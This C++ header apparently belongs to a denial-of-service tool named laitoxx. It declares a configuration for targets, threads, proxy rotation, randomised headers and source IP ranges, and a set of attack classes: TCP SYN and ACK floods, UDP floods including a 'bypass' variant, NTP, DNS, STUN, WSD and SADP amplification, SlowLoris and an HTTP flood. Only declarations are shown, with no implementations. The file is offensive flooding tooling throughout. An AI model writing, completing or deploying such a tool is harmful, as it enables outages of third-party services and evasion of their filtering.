#pragma once

#include <string>
#include <vector>
#include <atomic>
#include <thread>
#include <memory>
#include <functional>
#include <map>

namespace laitoxx {

// Forward declarations
class HeaderManager;
class IPRangeManager;
class ProxyConnector;
struct HeaderConfig;
struct ProxyConfig;

// Attack configuration structure
struct AttackConfig {
    std::string target_ip;
    int port = 80;
    int duration_seconds = 60;
    int thread_count = 1;

    // Proxy configuration
    bool use_proxy = false;
    std::string proxy_type = "http";
    std::vector<std::string> proxy_list;
    int proxy_retries = 3;

    // Header configuration
    bool enable_user_agent = true;
    bool enable_accept = true;
    bool enable_accept_language = true;
    bool enable_accept_encoding = true;
    bool enable_referer = true;
    bool enable_sec_headers = false;
    bool enable_client_hints = false;
    bool enable_proxy_headers = false;
    std::map<std::string, std::string> custom_headers;

    // IP Range configuration
    bool use_ip_ranges = false;
    std::string ip_range_name;  // e.g., "cloudflare", "ovh", etc.
    std::vector<std::string> ip_ranges_list;  // Direct list of CIDR ranges

    // Paths to resource directories
    std::string headers_dir = "headers";
    std::string ip_ranges_dir = "ip-ranges";
};

// Base attack class
class BaseAttack {
public:
    BaseAttack(const AttackConfig& config);
    virtual ~BaseAttack();

    virtual void start() = 0;
    virtual void stop();
    virtual uint64_t get_packets_sent() const;

    void set_log_callback(std::function<void(const std::string&)> callback);

    // Get proxy statistics
    virtual uint64_t get_proxy_success() const { return proxy_success_; }
    virtual uint64_t get_proxy_failures() const { return proxy_failures_; }

protected:
    AttackConfig config_;
    std::atomic<bool> stop_flag_;
    std::atomic<uint64_t> packets_sent_;
    std::atomic<uint64_t> proxy_success_;
    std::atomic<uint64_t> proxy_failures_;
    std::vector<std::thread> threads_;
    std::function<void(const std::string&)> log_callback_;

    // Shared managers (initialized once, shared across threads)
    static std::shared_ptr<HeaderManager> header_manager_;
    static std::shared_ptr<IPRangeManager> ip_range_manager_;
    static bool managers_initialized_;

    void log(const std::string& message);
    void worker_loop(std::function<void()> attack_func);

    // Initialize shared managers
    void initialize_managers();

    // Helper methods for subclasses
    std::map<std::string, std::string> generate_headers(const std::string& method_type);
    std::string get_random_ip_from_range();
    std::unique_ptr<ProxyConnector> create_proxy_connector();
};

// TCP Attack implementations
class TCPSynAttack : public BaseAttack {
public:
    using BaseAttack::BaseAttack;
    void start() override;
private:
    void attack_worker();
};

class TCPAckAttack : public BaseAttack {
public:
    using BaseAttack::BaseAttack;
    void start() override;
private:
    void attack_worker();
};

// UDP Attack implementations
class UDPFloodAttack : public BaseAttack {
public:
    using BaseAttack::BaseAttack;
    void start() override;
private:
    void attack_worker();
};

class UDPBypassAttack : public BaseAttack {
public:
    using BaseAttack::BaseAttack;
    void start() override;
private:
    void attack_worker();
};

// Amplification attacks
class AMPAttack : public BaseAttack {
public:
    enum class AMPType {
        NTP,
        DNS,
        STUN,
        WSD,
        SADP
    };

    AMPAttack(const AttackConfig& config, AMPType type);
    void start() override;

private:
    AMPType amp_type_;
    void attack_worker();
    std::string get_amp_server();
    int get_amp_port();
};

// SlowLoris attack
class SlowLorisAttack : public BaseAttack {
public:
    using BaseAttack::BaseAttack;
    void start() override;
private:
    void attack_worker();
    std::vector<int> sockets_;
};

// HTTP Flood attack
class HTTPFloodAttack : public BaseAttack {
public:
    using BaseAttack::BaseAttack;
    void start() override;
private:
    void attack_worker();
    std::string generate_user_agent();
    std::string generate_headers();
};

// Factory function
std::unique_ptr<BaseAttack> create_attack(
    const std::string& attack_type,
    const AttackConfig& config
);

} // namespace laitoxx
